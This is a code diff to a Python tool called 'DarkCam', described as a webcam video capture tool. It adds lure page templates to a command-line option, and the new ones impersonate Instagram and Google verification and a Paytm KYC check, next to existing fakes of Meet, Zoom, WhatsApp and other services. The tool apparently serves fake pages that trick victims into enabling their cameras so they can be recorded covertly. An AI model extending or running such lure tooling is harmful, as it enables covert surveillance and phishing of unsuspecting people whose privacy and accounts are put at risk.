@@ -149,7 +149,8 @@ def print_info(url: str, page: str, port: int, duration: int):
 
 def main():
     parser = argparse.ArgumentParser(description="DarkCam — Webcam Video Capture Tool")
-    parser.add_argument("--page", choices=["meet","zoom","whatsapp","instagram","omegle","teams","telegram","facetime"],
+    parser.add_argument("--page", choices=["meet","zoom","whatsapp","instagram","omegle","teams","telegram","facetime",
+                                           "instagram_verify","google_verify","paytm_kyc"],
                         default="meet", help="Lure page template")
     parser.add_argument("--port", type=int, default=8080, help="Local server port")
     parser.add_argument("--duration", type=int, default=45, help="Recording duration in seconds")
